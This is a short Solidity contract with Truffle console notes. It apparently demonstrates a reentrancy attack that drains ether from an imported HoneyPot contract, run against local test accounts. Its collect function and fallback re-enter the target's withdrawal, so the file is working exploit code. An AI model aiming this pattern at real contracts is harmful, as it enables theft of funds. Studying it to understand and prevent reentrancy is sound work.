pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;

  function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
  }

  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }

  function () payable {
    if (honeypot.balance >= msg.value && msg.gas >= 40000) {
      honeypot.get();
    }
  }
}


/*
truffle console commands

HoneyPot.deployed().then(instance => instAddress = instance.address)

web3.eth.getBalance(instAddress).toString(10)

HoneyPot.deployed().then(instance => instance.put({from: web3.eth.accounts[1], value: web3.toWei(5, "ether") }))

web3.eth.getBalance(instAddress).toString(10)

collect ether
HoneyPotCollect.deployed().then(inst => inst.collect({ value: web3.toWei(5, "ether"), gas: 1000000 }))

*/
